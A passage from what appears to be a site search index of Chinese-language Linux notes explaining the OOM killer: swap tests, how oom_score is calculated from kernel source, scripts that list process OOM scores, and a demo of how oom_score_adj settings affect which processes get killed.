/oom_adj\u8bbe\u7f6e\u503c\u4e3a-17\uff0c\u8868\u793a\u8be5\u8fdb\u7a0b\u4e0d\u53ef\u88ab\u6740\u6b7b\u3002","title":"OOM\u673a\u5236\u5b9e\u73b0"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E6%9C%BA%E5%88%B6/#oom_1","text":"","title":"OOM\u673a\u5236\u7684\u51e0\u7ec4\u6d4b\u8bd5"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E6%9C%BA%E5%88%B6/#1-oom","text":"\u7269\u7406\u673a\u5668\u914d\u7f6e\uff1a2G\u5185\u5b58\uff0c\u65e0swap\u5206\u533a \u6267\u884c\u547d\u4ee4\uff1a20\u4e2adepmod -a\u547d\u4ee4 \u7ed3\u679c\uff1a \u673a\u5668\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\uff0c\u53ef\u4ee5\u770b\u5230/var/log/message\u4e2d\u51fa\u73b0out of memory\uff1a kill process\u4fe1\u606f\uff1b \u5f53\u65e0\u8fdb\u7a0b\u53ef\u6740\u65f6\uff0c\u673a\u5668panic\u3002","title":"\u6d4b\u8bd51 \u6253\u5f00OOM\u673a\u5236\uff08\u9ed8\u8ba4\uff09"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E6%9C%BA%E5%88%B6/#2-oom","text":"\u901a\u8fc7\u7ed9\u5185\u6838\u6253patch\uff0c\u5c06oom_killer_disabled\u503c\u8bbe\u7f6e\u4e3a1\uff0c\u53e6\u5916\u901a\u8fc7sys\u63a5\u53e3\u5c06sysctl_would_have_oomkilled\u503c\u8bbe\u7f6e\u4e3a1\u3002 1. \u6709swap\u5206\u533a\u65f6 \u7269\u7406\u673a\u5668\u914d\u7f6e\uff1a2G\u5185\u5b58\uff0c2G\u5927\u5c0fswap\u5206\u533a \u6267\u884c\u547d\u4ee4\uff1a20\u4e2adepmod -a\u547d\u4ee4 \u7ed3\u679c\uff1a a) \u673a\u5668\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\uff0c/var/log/message\u4e2d\u4e0d\u51fa\u73b0out of memory\uff1a kill process * \u5b57\u6837 b) free -m -s 1\u547d\u4ee4\u89c2\u5bdf\u5f53\u524d\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5185\u5b58\u4f7f\u7528\u5b8c\u6bd5\u540e\uff0c\u5f00\u59cb\u4f7f\u7528swap\u5206\u533a\uff0c\u5f53swap\u5206\u533a\u4f7f\u7528\u5b8c\u540e\uff0c\u7cfb\u7edf\u4f1a\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u91ca\u653e\u51fa\u4e00\u6bb5swap\u5206\u533a\u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u673a\u5668\u5f88\u5361\u3002 \u65e0swap\u5206\u533a\u65f6 \u7269\u7406\u673a\u5668\u914d\u7f6e\uff1a2G\u5185\u5b58\uff0c\u65e0swap\u5206\u533a \u6267\u884c\u547d\u4ee4\uff1a20\u4e2adepmod -a\u547d\u4ee4 \u7ed3\u679c\uff1a a) \u673a\u5668\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\uff0c/var/log/message\u4e2d\u4e0d\u51fa\u73b0out of memory\uff1a kill process * \u5b57\u6837\uff1b b) free -m -s 1\u547d\u4ee4\u89c2\u5bdf\u5f53\u524d\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5185\u5b58\u4f7f\u7528\u5b8c\u6bd5\u540e\uff0c\u673a\u5668\u5f88\u5361\uff0c\u65e0\u6cd5\u64cd\u4f5c \uff0c\u4f46\u662f\u53ef\u4ee5ping\u901a\u3002 \u6d4b\u8bd5\u7ed3\u679c\u5206\u6790 \u5173\u95edOOM\u673a\u5236\uff0c\u867d\u7136\u4e0d\u4f1a\u51fa\u73b0\u6740\u8fdb\u7a0b\u7684\u73b0\u8c61\uff0c\u4f46\u662f\u5e94\u7528\u7a0b\u5e8f\u5728\u7533\u8bf7\u5185\u5b58\u8d44\u6e90\u65f6\u7531\u4e8e\u5185\u5b58\u8d44\u6e90\u7d27\u5f20\u5bfc\u81f4\u7533\u8bf7\u4e0d\u5230\u8d44\u6e90\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u4e00\u76f4\u5faa\u73af\u7533\u8bf7\u5185\u5b58\uff0c\u76f4\u5230\u7533\u8bf7\u5230\u4e3a\u6b62\uff0c\u5728\u672a\u7533\u8bf7\u5230\u5185\u5b58\u8d44\u6e90\u4e4b\u524d\uff0c\u4f1a\u4e00\u76f4\u5360\u7528\u67d0\u4e2aCPU\u4e0d\u653e\uff0c\u5bfc\u81f4\u673a\u5668\u5361\u4f4f\u3002 \u4ece\u6d4b\u8bd5\u4e2d\u53ef\u4ee5\u770b\u5230\uff0cswap\u5206\u533a\u80fd\u591f\u7f13\u89e3\u4e00\u4e0b\u5185\u5b58\u7d27\u5f20\u7684\u60c5\u51b5\uff0c\u5982\u679c\u80fd\u591f\u5229\u7528\u597dswap\u5206\u533a\uff0c\u5e76\u4e14\u5e94\u7528\u7a0b\u5e8f\u4e0d\u4f1a\u51fa\u73b0\u5185\u5b58\u6cc4\u6f0f\u7b49\u95ee\u9898\u65f6\uff0c\u53ef\u4ee5\u7f13\u89e3\u5185\u5b58\u7d27\u5f20\u7684\u60c5\u51b5\uff0c\u4f46\u8fd8\u662f\u4e0d\u80fd\u907f\u514d\u673a\u5668\u5361\u4f4f\u7684\u73b0\u8c61\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5f53\u673a\u5668\u5361\u4f4f\u65f6\uff0c\u6027\u80fd\u5df2\u7ecf\u65e0\u6cd5\u4fdd\u8bc1\u3002","title":"\u6d4b\u8bd52 \u5173\u95edOOM\u673a\u5236"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E8%AF%84%E5%88%86%E6%98%AF%E5%A6%82%E4%BD%95%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84/","text":"oom_score Linux\u7684OOM-Kill\u7b56\u7565\u662f\u4e3a\u4e86\u5728\u5185\u5b58\u4e0d\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u6740\u6389\u6d88\u8017\u5185\u5b58\u6700\u591a\u3001\u4f18\u5148\u7ea7\u6700\u4f4e\u7684\u4efb\u52a1\uff0c\u4ece\u800c\u4fdd\u969c\u7cfb\u7edf\u4e0d\u88ab\u641e\u6302\u3002\u8fd9\u91cc\u6709\u4e24\u4e2a\u53d6\u51b3\u56e0\u7d20\uff1a /proc/ /oom_score\u5185\u6838\u901a\u8fc7\u5185\u5b58\u6d88\u8017\u8ba1\u7b97\u5f97\u51fa /proc/ /oom_score_adj\u5141\u8bb8\u7528\u4e8e\u81ea\u5b9a\u4e49\uff0c\u7b49\u540c\u4e8e\u4f18\u5148\u7ea7\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\u503c\u8d8a\u5c0f\uff08-1000 ~1000\uff09\u3002 /proc/ /oom_adj\u91cc\u9762\uff0c\u53d6\u503c\u662f-17\u5230+15(\u4e3a-17\u6b64\u8fdb\u7a0b\u4e0d\u4f1a\u88ab\u6740\u6389)\uff0c\u53d6\u503c\u8d8a\u9ad8\uff0c\u8d8a\u5bb9\u6613\u88ab\u6740\u6389\u3002 \u5f53\u5185\u5b58\u7d27\u5f20\u7684\u65f6\u5019\uff0c\u5185\u6838\u901a\u8fc7 oom = oom_score + oom_score_adj \u8ba1\u7b97\u51fa\u5206\u6570\u6700\u9ad8\u7684\u8fdb\u7a0b\uff0c\u5411\u5176\u53d1\u9001\u5173\u95ed\u4fe1\u53f7\u3002 \u6574\u4e2a\u6d41\u7a0b\u600e\u6837\u7684\u5462\uff1f\u76f4\u63a5\u4e0a\u4ee3\u7801\uff08\u4ee3\u7801\u4f4d\u4e8e\u5185\u6838/mm/oom_kill.c\uff09 1\u3001\u8ba1\u7b97oom //\u8ba1\u7b97oom unsigned long oom_badness(struct task_struct *p, struct mem_cgroup *memcg, const nodemask_t *nodemask, unsigned long totalpages) { //\u603b\u5185\u5b58= \u7269\u7406\u5185\u5b58 + \u4ea4\u6362\u5206\u533a *totalpages = totalram_pages + total_swap_pages; //\u7d2f\u52a0 \u5e38\u9a7b\u5185\u5b58RSS + \u8fdb\u7a0b\u9875\u9762 +\u4ea4\u6362\u5185\u5b58 points = get_mm_rss(p->mm) + atomic_long_read(&p->mm->nr_ptes) + get_mm_counter(p->mm, MM_SWAPENTS); //oom_score_adj \u5f52\u4e00\u5316 adj *= totalpages / 1000; //oom = oom_score + oom_score_adj points += adj; 2\u3001\u901a\u8fc7\u5faa\u73af\u8c03\u7528oom_badness\u627e\u51faoom\u6700\u5927\u7684\u8fdb\u7a0b //\u627e\u51faoom\u6700\u5927\u7684\u8fdb\u7a0b static struct task_struct *select_bad_process(unsigned int *ppoints, unsigned long totalpages, const nodemask_t *nodemask, bool force_kill) //\u5faa\u73af\u904d\u5386\u6240\u6709\u8fdb\u7a0b for_each_process_thread(g, p) { //\u8c03\u7528\u4e0a\u9762\u7684oom_badness\u65b9\u6cd5\u8ba1\u7b97oom points = oom_badness(p, NULL, nodemask, totalpages); //\u9009\u51fa\u6700\u5927oom\u8fdb\u7a0b if (!points || points < chosen_points) continue; if (points == chosen_points && thread_group_leader(chosen)) continue; chosen = p; chosen_points = points; 3\u3001\u5173\u95ed\u8fdb\u7a0b //\u53d1\u9001kill\u4fe1\u53f7\u5173\u95ed\u8fdb\u7a0b oom_kill_process(p, gfp_mask, order, points, totalpages, NULL, nodemask, \"Out of memory\"); \u5982\u679c\u89c9\u5f97\u4e0a\u9762\u8ba1\u7b97oom_score\u4ee3\u7801\u770b\u7740\u6709\u70b9\u6655\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f oom_score\u8ba1\u7b97\u65b9\u6cd5 oom_score = \u5185\u5b58\u6d88\u8017/\u603b\u5185\u5b58 *1000 \u5176\u4e2d \u5185\u5b58\u6d88\u8017\u5305\u62ec\u4e86\uff1a\u5e38\u9a7b\u5185\u5b58RSS + \u8fdb\u7a0b\u9875\u9762 + \u4ea4\u6362\u5185\u5b58 \u603b\u5185\u5b58\u5c31\u7b80\u5355\u4e86\uff1a\u603b\u7684\u7269\u7406\u5185\u5b58 +\u4ea4\u6362\u5206\u533a Demo\u9a8c\u8bc1 \u901a\u8fc7\u4e0b\u9762\u7684\u811a\u672c\u53ef\u4ee5\u6253\u5370\u6240\u4ee5oom_score\u4e0d\u4e3a0\u7684\u7a0b\u5e8f #!/bin/bash # Displays running processes in descending order of OOM score printf 'PID\\tOOM Score\\tOOM Adj\\tCommand\\n' ps -e -o pid= -o comm= | while read -r pid comm; do [ -f /proc/$pid/oom_score ] && [ $(cat /proc/$pid/oom_score) != 0 ] && printf '%d\\t%d\\t\\t%d\\t%s\\n' \"$pid\" \"$(cat /proc/$pid/oom_score)\" \"$(cat /proc/$pid/oom_score_adj)\" \"$comm\"; done | sort -k 2nr \u8f93\u51fa\u5982\u4e0b\uff1a PID OOM Score OOM Adj Command 7859 26 0 java \u53ef\u4ee5\u770b\u5230pid\u4e3a7859\u8fdb\u7a0b\u7684oom_score \u4e3a26 # pidstat -r -p 7859 05:50:32 PM UID PID minflt/s majflt/s VSZ RSS %MEM Command 05:50:32 PM 0 7859 0.15 0.00 10081456 363704 2.21 java \u7a0b\u5e8f\u5360\u7528\u7684RSS\u4e3a\uff1a363704KB/1024 = 355.2M \u901a\u8fc7\u4e0b\u9762\u811a\u672c\u53ef\u4ee5\u770b\u51faswap\u4f7f\u7528 $ for i in $(ls /proc | grep \"^[0-9]\" | awk '$0>100'); do awk '/Swap:/{a=a+$2}END{print '\"$i\"',a/1024\"M\"}' /proc/$i/smaps;done 2>/dev/null | sort -k2nr | grep 7859 $ 7859 292.898M \u8003\u8651\u5230\u9875\u8868\u672c\u8eab\u5360\u7528\u5f88\u5c11\uff0c\u5728\u6b64\u5ffd\u7565\u4e86\uff0c # free -m total used free shared buff/cache available Mem: 16040 1878 2095 290 12066 13397 Swap: 8191 969 7222 \u6574\u4e2a\u673a\u5668\u7684\u5185\u5b58\uff1a16040 + 8191 = 24231 M\u3002 \u7efc\u5408\u4e0a\u9762\u7684\u6570\u636e\u53ef\u4ee5\u7b97\u51fa\uff1a oom_score = (293+355)/24231*1000 \u7ea6\u7b49\u4e8e26\u3002 \u624b\u52a8\u8ba9\u8fdb\u7a0b\u4e0d\u5bb9\u6613\u88ab\u56de\u6536 \u4fee\u6539oom_score_adj\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u65b9\u5f0f echo -200 > /proc/\u8fdb\u7a0bID/oom_score_adj \u6a21\u62df \u5728 linux \u7cfb\u7edf\u4e0b\uff0c\u5185\u5b58\u4e0d\u8db3\u4f1a\u89e6\u53d1 OOM killer \u53bb\u6740\u8fdb\u7a0b \u4e0b\u9762\u6a21\u62df\u4e00\u4e0b\uff0c\u51e0\u79d2\u4e4b\u540e\u663e\u793a\u88abKilled\u4e86\uff1a $ cat oom.c #include <stdlib.h> #include <stdio.h> #define BYTES (8 * 1024 * 1024) int main(void) { printf(\"hello OOM \\n\"); while(1) { char *p = malloc(BYTES); if (p == NULL) { return -1; } } return 0; } $ gcc oom.c $ ./a.out hello OOM Killed $ \u7528 dmesg \u547d\u4ee4\u53ef\u4ee5\u770b\u5230\u76f8\u5173 log\uff1a a.out invoked oom-killer: gfp_mask=0x26084c0, order=0, oom_score_adj=0 Out of memory: Kill process 97843 (a.out) score 835 or sacrifice child oom_score_adj \u4e0a\u9762\u6253\u5370\u4e86 oom_score_adj=0 \u4ee5\u53ca score 835 \uff0cOOM killer \u7ed9\u8fdb\u7a0b\u6253\u5206\uff0c\u628a oom_score \u6700\u5927\u7684\u8fdb\u7a0b\u5148\u6740\u6b7b\u3002 \u6253\u5206\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7ec4\u6210\uff1a \u7cfb\u7edf\u6839\u636e\u8be5\u8fdb\u7a0b\u7684\u5185\u5b58\u5360\u7528\u60c5\u51b5\u6253\u5206\uff0c\u8fdb\u7a0b\u7684\u5185\u5b58\u5f00\u9500\u662f\u53d8\u5316\u7684\uff0c\u6240\u4ee5\u8be5\u503c\u4e5f\u4f1a\u52a8\u6001\u53d8\u5316\u3002 \u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u7684 oom_score_adj\uff0c\u8303\u56f4\u662f -1000\u5230 1000\uff0c\u5b9a\u4e49\u5728\uff1ahttps://elixir.bootlin.com/linux/v5.0/source/include/uapi/linux/oom.h#L9 /* * /proc/<pid>/oom_score_adj set to OOM_SCORE_ADJ_MIN disables oom killing for * pid. */ #define OOM_SCORE_ADJ_MIN (-1000) #define OOM_SCORE_ADJ_MAX 1000 \u5982\u679c\u7528\u6237\u5c06\u8be5\u8fdb\u7a0b\u7684 oom_score_adj \u8bbe\u5b9a\u6210 -1000\uff0c\u8868\u793a\u7981\u6b62OOM killer \u6740\u6b7b\u8be5\u8fdb\u7a0b\uff08\u4ee3\u7801\u5728 https://elixir.bootlin.com/linux/v5.0/source/mm/oom_kill.c#L222 \uff09\u3002\u6bd4\u5982 sshd \u7b49\u975e\u5e38\u91cd\u8981\u7684\u670d\u52a1\u53ef\u4ee5\u914d\u7f6e\u4e3a -1000\u3002 \u5982\u679c\u8bbe\u7f6e\u4e3a\u8d1f\u6570\uff0c\u8868\u793a\u5206\u6570\u4f1a\u6253\u4e00\u5b9a\u7684\u6298\u6263\u3002 \u5982\u679c\u8bbe\u7f6e\u4e3a\u6b63\u6570\uff0c\u5206\u6570\u4f1a\u589e\u52a0\uff0c\u53ef\u4ee5\u4f18\u5148\u6740\u6b7b\u8be5\u8fdb\u7a0b\u3002 \u5982\u679c\u8bbe\u7f6e\u4e3a0 \uff0c\u8868\u793a\u7528\u6237\u4e0d\u8c03\u6574\u5206\u6570\uff0c0 \u662f\u9ed8\u8ba4\u503c\u3002 \u6d4b\u8bd5\u8bbe\u7f6e oom_score_adj \u5bf9 oom_score \u7684\u5f71\u54cd #include <stdlib.h> #include <stdio.h> #define BYTES (8 * 1024 * 1024) #define N (10240) int main(void) { printf(\"hello OOM \\n\"); int i; for (i = 0; i < N; i++) { char *p = malloc(BYTES); if (p == NULL) { return -1; } } printf(\"while... \\n\"); while(1); return 0; } \u4e0b\u9762\u662f\u521d\u59cb\u7684\u5206\u6570\uff1a $ cat /proc/$(pidof a.out)/oom_score_adj 0 $ cat /proc/$(pidof a.out)/oom_score 62 \u4e0b\u9762\u4fee\u6539 oom_score_adj\uff0coom_score \u4e5f\u968f\u4e4b\u53d1\u751f\u4e86\u53d8\u5316\uff1a $ sudo sh -c \"echo -50 > /proc/$(pidof a.out)/oom_score_adj\" $ cat /proc/$(pidof a.out)/oom_score_adj -50 $ cat /proc/$(pidof a.out)/oom_score 12 $ sudo sh -c \"echo -60 > /proc/$(pidof a.out)/oom_score_adj\" $ cat /proc/$(pidof a.out)/oom_score_adj -60 $ cat /proc/$(pidof a.out)/oom_score 2 $ sudo sh -c \"echo -500 > /proc/$(pidof a.out)/oom_score_adj\" $ cat /proc/$(pidof a.out)/oom_score_adj -500 $ cat /proc/$(pidof a.out)/oom_score 0 \u6d4b\u8bd5\u8bbe\u7f6e oom_score_adj \u8bbe\u7f6e\u4e3a-1000 \u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd \u5982\u679c\u628a\u4e00\u4e2a\u65e0\u9650\u7533\u8bf7\u5185\u5b58\u7684\u8fdb\u7a0b\u8bbe\u7f6e\u4e3a-1000\uff0c\u4f1a\u53d1\u751f\u4ec0\u4e48\u5462\uff1a $ sudo sh -c \"echo -1000 > /proc/$(pidof a.out)/oom_score_adj\" $ dmesg | grep \"Out of memory\" Out of memory: Kill process 1000 (mysqld) score 67 or sacrifice child Out of memory: Kill process 891 (vmhgfs-fuse) score 1 or sacrifice child Out of memory: Kill process 321 (systemd-journal) score 1 or sacrifice child Out of memory: Kill process 1052 ((sd-pam)) score 1 or sacrifice child Out of memory: Kill process 1072 (bash) score 0 or sacrifice child \u56e0\u4e3a bash \u6302\u4e86\uff0c\u6240\u4ee5 a.out \u4e5f\u6302\u4e86\u3002 \u5982\u679c ./a.out & \u5728\u540e\u53f0\u8fd0\u884c\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u7528\u66f4\u591a\u8fdb\u7a0b\u7684 score \u662f 0 \u4ecd\u7136\u6302\u6389\u4e86\uff0c\u6bd4\u5982 sshd\u3001dhclient\u3001systemd-logind\u3001systemd-timesyn\u3001dbus-daemon \u7b49\uff0c\u6240\u4ee5\u8bbe\u7f6e\u9519\u8bef\u7684 oom_score_adj \u540e\u679c\u6bd4\u8f83\u4e25\u91cd\u3002 https://www.jianshu.com/p/bbaeff371019 https://blog.csdn.net/u010278923/article/details/105688107","title":"oom\u8bc4\u5206\u662f\u5982\u4f55\u7b97\u51fa\u6765"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E8%AF%84%E5%88%86%E6%98%AF%E5%A6%82%E4%BD%95%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84/#oom_score","text":"Linux\u7684OOM-Kill\u7b56\u7565\u662f\u4e3a\u4e86\u5728\u5185\u5b58\u4e0d\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u6740\u6389\u6d88\u8017\u5185\u5b58\u6700\u591a\u3001\u4f18\u5148\u7ea7\u6700\u4f4e\u7684\u4efb\u52a1\uff0c\u4ece\u800c\u4fdd\u969c\u7cfb\u7edf\u4e0d\u88ab\u641e\u6302\u3002\u8fd9\u91cc\u6709\u4e24\u4e2a\u53d6\u51b3\u56e0\u7d20\uff1a /proc/ /oom_score\u5185\u6838\u901a\u8fc7\u5185\u5b58\u6d88\u8017\u8ba1\u7b97\u5f97\u51fa /proc/ /oom_score_adj\u5141\u8bb8\u7528\u4e8e\u81ea\u5b9a\u4e49\uff0c\u7b49\u540c\u4e8e\u4f18\u5148\u7ea7\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\u503c\u8d8a\u5c0f\uff08-1000 ~1000\uff09\u3002 /proc/ /oom_adj\u91cc\u9762\uff0c\u53d6\u503c\u662f-17\u5230+15(\u4e3a-17\u6b64\u8fdb\u7a0b\u4e0d\u4f1a\u88ab\u6740\u6389)\uff0c\u53d6\u503c\u8d8a\u9ad8\uff0c\u8d8a\u5bb9\u6613\u88ab\u6740\u6389\u3002 \u5f53\u5185\u5b58\u7d27\u5f20\u7684\u65f6\u5019\uff0c\u5185\u6838\u901a\u8fc7 oom = oom_score + oom_score_adj \u8ba1\u7b97\u51fa\u5206\u6570\u6700\u9ad8\u7684\u8fdb\u7a0b\uff0c\u5411\u5176\u53d1\u9001\u5173\u95ed\u4fe1\u53f7\u3002 \u6574\u4e2a\u6d41\u7a0b\u600e\u6837\u7684\u5462\uff1f\u76f4\u63a5\u4e0a\u4ee3\u7801\uff08\u4ee3\u7801\u4f4d\u4e8e\u5185\u6838/mm/oom_kill.c\uff09 1\u3001\u8ba1\u7b97oom //\u8ba1\u7b97oom unsigned long oom_badness(struct task_struct *p, struct mem_cgroup *memcg, const nodemask_t *nodemask, unsigned long totalpages) { //\u603b\u5185\u5b58= \u7269\u7406\u5185\u5b58 + \u4ea4\u6362\u5206\u533a *totalpages = totalram_pages + total_swap_pages; //\u7d2f\u52a0 \u5e38\u9a7b\u5185\u5b58RSS + \u8fdb\u7a0b\u9875\u9762 +\u4ea4\u6362\u5185\u5b58 points = get_mm_rss(p->mm) + atomic_long_read(&p->mm->nr_ptes) + get_mm_counter(p->mm, MM_SWAPENTS); //oom_score_adj \u5f52\u4e00\u5316 adj *= totalpages / 1000; //oom = oom_score + oom_score_adj points += adj; 2\u3001\u901a\u8fc7\u5faa\u73af\u8c03\u7528oom_badness\u627e\u51faoom\u6700\u5927\u7684\u8fdb\u7a0b //\u627e\u51faoom\u6700\u5927\u7684\u8fdb\u7a0b static struct task_struct *select_bad_process(unsigned int *ppoints, unsigned long totalpages, const nodemask_t *nodemask, bool force_kill) //\u5faa\u73af\u904d\u5386\u6240\u6709\u8fdb\u7a0b for_each_process_thread(g, p) { //\u8c03\u7528\u4e0a\u9762\u7684oom_badness\u65b9\u6cd5\u8ba1\u7b97oom points = oom_badness(p, NULL, nodemask, totalpages); //\u9009\u51fa\u6700\u5927oom\u8fdb\u7a0b if (!points || points < chosen_points) continue; if (points == chosen_points && thread_group_leader(chosen)) continue; chosen = p; chosen_points = points; 3\u3001\u5173\u95ed\u8fdb\u7a0b //\u53d1\u9001kill\u4fe1\u53f7\u5173\u95ed\u8fdb\u7a0b oom_kill_process(p, gfp_mask, order, points, totalpages, NULL, nodemask, \"Out of memory\"); \u5982\u679c\u89c9\u5f97\u4e0a\u9762\u8ba1\u7b97oom_score\u4ee3\u7801\u770b\u7740\u6709\u70b9\u6655\uff0c\u7b80\u5355\u6765\u8bf4\u5c31\u662f","title":"oom_score"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E8%AF%84%E5%88%86%E6%98%AF%E5%A6%82%E4%BD%95%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84/#oom_score_1","text":"oom_score = \u5185\u5b58\u6d88\u8017/\u603b\u5185\u5b58 *1000 \u5176\u4e2d \u5185\u5b58\u6d88\u8017\u5305\u62ec\u4e86\uff1a\u5e38\u9a7b\u5185\u5b58RSS + \u8fdb\u7a0b\u9875\u9762 + \u4ea4\u6362\u5185\u5b58 \u603b\u5185\u5b58\u5c31\u7b80\u5355\u4e86\uff1a\u603b\u7684\u7269\u7406\u5185\u5b58 +\u4ea4\u6362\u5206\u533a","title":"oom_score\u8ba1\u7b97\u65b9\u6cd5"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E8%AF%84%E5%88%86%E6%98%AF%E5%A6%82%E4%BD%95%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84/#demo","text":"\u901a\u8fc7\u4e0b\u9762\u7684\u811a\u672c\u53ef\u4ee5\u6253\u5370\u6240\u4ee5oom_score\u4e0d\u4e3a0\u7684\u7a0b\u5e8f #!/bin/bash # Displays running processes in descending order of OOM score printf 'PID\\tOOM Score\\tOOM Adj\\tCommand\\n' ps -e -o pid= -o comm= | while read -r pid comm; do [ -f /proc/$pid/oom_score ] && [ $(cat /proc/$pid/oom_score) != 0 ] && printf '%d\\t%d\\t\\t%d\\t%s\\n' \"$pid\" \"$(cat /proc/$pid/oom_score)\" \"$(cat /proc/$pid/oom_score_adj)\" \"$comm\"; done | sort -k 2nr \u8f93\u51fa\u5982\u4e0b\uff1a PID OOM Score OOM Adj Command 7859 26 0 java \u53ef\u4ee5\u770b\u5230pid\u4e3a7859\u8fdb\u7a0b\u7684oom_score \u4e3a26 # pidstat -r -p 7859 05:50:32 PM UID PID minflt/s majflt/s VSZ RSS %MEM Command 05:50:32 PM 0 7859 0.15 0.00 10081456 363704 2.21 java \u7a0b\u5e8f\u5360\u7528\u7684RSS\u4e3a\uff1a363704KB/1024 = 355.2M \u901a\u8fc7\u4e0b\u9762\u811a\u672c\u53ef\u4ee5\u770b\u51faswap\u4f7f\u7528 $ for i in $(ls /proc | grep \"^[0-9]\" | awk '$0>100'); do awk '/Swap:/{a=a+$2}END{print '\"$i\"',a/1024\"M\"}' /proc/$i/smaps;done 2>/dev/null | sort -k2nr | grep 7859 $ 7859 292.898M \u8003\u8651\u5230\u9875\u8868\u672c\u8eab\u5360\u7528\u5f88\u5c11\uff0c\u5728\u6b64\u5ffd\u7565\u4e86\uff0c # free -m total used free shared buff/cache available Mem: 16040 1878 2095 290 12066 13397 Swap: 8191 969 7222 \u6574\u4e2a\u673a\u5668\u7684\u5185\u5b58\uff1a16040 + 8191 = 24231 M\u3002 \u7efc\u5408\u4e0a\u9762\u7684\u6570\u636e\u53ef\u4ee5\u7b97\u51fa\uff1a oom_score = (293+355)/24231*1000 \u7ea6\u7b49\u4e8e26\u3002","title":"Demo\u9a8c\u8bc1"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E8%AF%84%E5%88%86%E6%98%AF%E5%A6%82%E4%BD%95%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84/#_1","text":"\u4fee\u6539oom_score_adj\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u65b9\u5f0f echo -200 > /proc/\u8fdb\u7a0bID/oom_score_adj","title":"\u624b\u52a8\u8ba9\u8fdb\u7a0b\u4e0d\u5bb9\u6613\u88ab\u56de\u6536"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E8%AF%84%E5%88%86%E6%98%AF%E5%A6%82%E4%BD%95%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84/#_2","text":"\u5728 linux \u7cfb\u7edf\u4e0b\uff0c\u5185\u5b58\u4e0d\u8db3\u4f1a\u89e6\u53d1 OOM killer \u53bb\u6740\u8fdb\u7a0b \u4e0b\u9762\u6a21\u62df\u4e00\u4e0b\uff0c\u51e0\u79d2\u4e4b\u540e\u663e\u793a\u88abKilled\u4e86\uff1a $ cat oom.c #include <stdlib.h> #include <stdio.h> #define BYTES (8 * 1024 * 1024) int main(void) { printf(\"hello OOM \\n\"); while(1) { char *p = malloc(BYTES); if (p == NULL) { return -1; } } return 0; } $ gcc oom.c $ ./a.out hello OOM Killed $ \u7528 dmesg \u547d\u4ee4\u53ef\u4ee5\u770b\u5230\u76f8\u5173 log\uff1a a.out invoked oom-killer: gfp_mask=0x26084c0, order=0, oom_score_adj=0 Out of memory: Kill process 97843 (a.out) score 835 or sacrifice child","title":"\u6a21\u62df"},{"location":"system/linux/%E5%86%85%E5%AD%98/oom%E8%AF%84%E5%88%86%E6%98%AF%E5%A6%82%E4%BD%95%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84/#oom_score_adj","text":"\u4e0a\u9762\u6253\u5370\u4e86 oom_score_adj=0 \u4ee5\u53ca score 835 \uff0cOOM killer \u7ed9\u8fdb\u7a0b\u6253\u5206\uff0c\u628a oom_score \u6700\u5927\u7684\u8fdb\u7a0b\u5148\u6740\u6b7b\u3002 \u6253\u5206\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7ec4\u6210\uff1a \u7cfb\u7edf\u6839\u636e\u8be5\u8fdb\u7a0b\u7684\u5185\u5b58\u5360\u7528\u60c5\u51b5\u6253\u5206\uff0c\u8fdb\u7a0b\u7684\u5185\u5b58\u5f00\u9500\u662f\u53d8\u5316\u7684\uff0c\u6240\u4ee5\u8be5\u503c\u4e5f\u4f1a\u52a8\u6001\u53d8\u5316\u3002 \u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u7684 oom_score_adj\uff0c\u8303\u56f4\u662f -1000\u5230 1000\uff0c\u5b9a\u4e49\u5728\uff1ahttps://elixir.bootlin.com/linux/v5.0/source/include/uapi/linux/oom.h#L9 /* * /proc/<pid>/oom_score_adj set to OOM_SCORE_ADJ_MIN disables oom killing for * pid. */ #define OOM_SCORE_ADJ_MIN (-1000) #define OOM_SCORE_ADJ_MAX 1000 \u5982\u679c\u7528\u6237\u5c06\u8be5\u8fdb\u7a0b\u7684 oom_score_adj \u8bbe\u5b9a\u6210 -1000\uff0c\u8868\u793a\u7981\u6b62OOM killer \u6740\u6b7b\u8be5\u8fdb\u7a0b\uff08\u4ee3\u7801\u5728 https://elixir.bootlin.com/linux/v5.0/source/mm/oom_kill.c#L222 \uff09\u3002\u6bd4\u5982 sshd \u7b49\u975e\u5e38\u91cd\u8981\u7684\u670d\u52a1\u53ef\u4ee5\u914d\u7f6e\u4e3a -1000\u3002 